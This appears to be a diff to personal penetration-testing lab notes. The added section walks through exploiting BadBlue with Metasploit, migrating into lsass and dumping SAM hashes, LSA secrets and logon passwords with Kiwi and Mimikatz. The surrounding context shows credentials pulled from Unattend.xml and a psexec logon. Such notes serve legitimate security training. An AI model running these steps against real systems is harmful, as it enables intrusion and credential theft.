@@ -230,3 +230,28 @@ INFO: this also exploit the rejetto 2.3 version as UAC with UACME
 9. `cd C:\\` -> `cd Windows` -> ` cd Panther` -> look for Unattend.xml file -> `download unattend.xml`
 10. look for usercreds = AutoLogon (encoded base64), create new file -> `vim password.txt` -> save password -> base64 -d password.txt
 11. logon with adm creds: `psexec.py username@10.10.x.x`
+
+### Dumping Hashes With Mimikatz
+
+- post exploitation tool
+- allows extraction of clear-text passwords, hashes and Kerberos tickets from memory
+- extract hashes from lsass.exe process memory
+- can be utilized with meterpreter extention Kiwi
+- Mimikatz will require elevated privleges in order to run correctly
+
+1. nmap: `nmap -sV 10.10.x.x`
+2. `service postgresql start && msfconsole`
+3. search `search badblue`, look for for "exploit/windows/http/badblue_passthru"
+4. set options and exploit
+5. meterpreter: `sysinfo`, `getuid`, `pgrep lsass` -> migrate to number
+6. `getuid` = NT AUTHORITY\SYSTEM
+7. `load kiwi` -> `creds_all`
+8. `lsa_dump_sam` and then `lsa_dump_secrets`
+9. navigate: `cd C:\\` -> `mkdir Temp` -> `cd Temp` -> `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` -> `shell`
+10. open Mimikatz `.\mimikatz.exe`
+11. check priveleges: `privilege::debug` -> Privelege '20' OK = good to go
+12. `lsadump::sam`
+13. `lsadump::secrets`
+14. Display logon passwords `sekurlsa::logonpasswords`
+
+### Pass-The-Hash Attack
